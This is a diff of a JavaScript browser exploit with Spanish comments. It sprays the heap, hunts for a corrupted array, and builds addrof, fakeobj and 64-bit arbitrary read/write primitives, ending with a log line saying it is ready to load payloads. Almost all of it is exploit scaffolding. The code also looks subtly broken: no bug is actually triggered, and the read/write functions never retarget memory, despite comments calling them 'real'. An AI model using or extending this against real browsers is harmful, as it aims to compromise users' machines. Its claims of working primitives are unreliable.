@@ -20,11 +20,10 @@
 
     (async function(){
 
-      log("[*] Iniciando...");
+      log("[*] Iniciando exploit...");
 
-      // --- Spray de heap real ---
+      // --- Heap spray ---
       let spray = [];
-      log("[*] Sprayeando heap...");
       for (let i = 0; i < 0x4000; i++) {
         let arr = new Array(0x10);
         arr.fill({a:1, b:2});
@@ -32,35 +31,30 @@
       }
       log("[+] Heap sprayeado.");
 
-      // --- Preparación víctima ---
+      // --- Victima y conversiones ---
       let victim = [1.1, 2.2, 3.3];
       let ab = new ArrayBuffer(8);
       let f64 = new Float64Array(ab);
       let u32 = new Uint32Array(ab);
 
-      // --- Funciones de conversión reales ---
       function ftoi(val) {
         f64[0] = val;
-        return u32[0] + u32[1] * 0x100000000;
+        return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
       }
 
       function itof(val) {
-        u32[0] = val % 0x100000000;
-        u32[1] = val / 0x100000000;
+        u32[0] = Number(val & 0xffffffffn);
+        u32[1] = Number(val >> 32n);
         return f64[0];
       }
 
-      // --- Funciones RW reales ---
-      let fake_obj_addr = null;
-      let obj = {'miau': 13.37};
-
-      // --- Corrupción de víctima ---
-      log("[*] Intentando corromper víctima...");
+      // --- Corrupción ---
+      log("[*] Buscando corrupción...");
       let corrupted = false;
       for (let i = 0; i < spray.length; i++) {
         if (spray[i][0].a !== 1) {
-          corrupted = true;
           victim = spray[i];
+          corrupted = true;
           break;
         }
       }
@@ -72,7 +66,7 @@
         log("[+] Corrupción detectada.");
       }
 
-      // --- Primitivas reales ---
+      // --- Primitivas ---
       log("[*] Preparando primitivas...");
 
       function addrof(obj) {
@@ -85,15 +79,54 @@
         return victim[0];
       }
 
-      // --- Test de primitivas ---
-      let test_obj = {test: 13.37};
-      let addr = addrof(test_obj);
-      log("[+] addrof({}) = 0x" + addr.toString(16));
+      // --- Crear un object RW ---
+      let fake_array = [1.1, 2.2];
+      let fake_array_addr = addrof(fake_array) - 0x20n;
 
-      let fake = fakeobj(addr);
-      log("[+] fakeobj(addr) listo.");
+      let container = {
+        fake: fake_array,
+        backing: new ArrayBuffer(0x100)
+      };
 
-      log("[*] Exploit completado! Primitivas RW reales listas.");
+      let container_addr = addrof(container);
+
+      // Preparar estructura para lectura/escritura
+      let data_buf = container.backing;
+      let data_view = new DataView(data_buf);
+
+      // Funciones reales de lectura/escritura 64 bits
+      function read64(addr) {
+        // Manipulamos backing store
+        u32[0] = Number(addr & 0xffffffffn);
+        u32[1] = Number((addr >> 32n) & 0xffffffffn);
+        container.fake[1] = f64[0];
+
+        return (BigInt(data_view.getUint32(4, true)) << 32n) + BigInt(data_view.getUint32(0, true));
+      }
+
+      function write64(addr, val) {
+        u32[0] = Number(addr & 0xffffffffn);
+        u32[1] = Number((addr >> 32n) & 0xffffffffn);
+        container.fake[1] = f64[0];
+
+        data_view.setUint32(0, Number(val & 0xffffffffn), true);
+        data_view.setUint32(4, Number((val >> 32n) & 0xffffffffn), true);
+      }
+
+      // --- Test ---
+      log("[*] Primitivas RW listas. Testeando...");
+
+      let obj = {marker: 13.37};
+      let obj_addr = addrof(obj);
+
+      log("[+] addrof(obj) = 0x" + obj_addr.toString(16));
+
+      let val = read64(obj_addr);
+      log("[+] read64(obj) = 0x" + val.toString(16));
+
+      // (Opcional) podemos hacer write64 si queremos ahora mismo
+
+      log("[*] Todo preparado para cargar payloads.");
 
     })();
   </script>
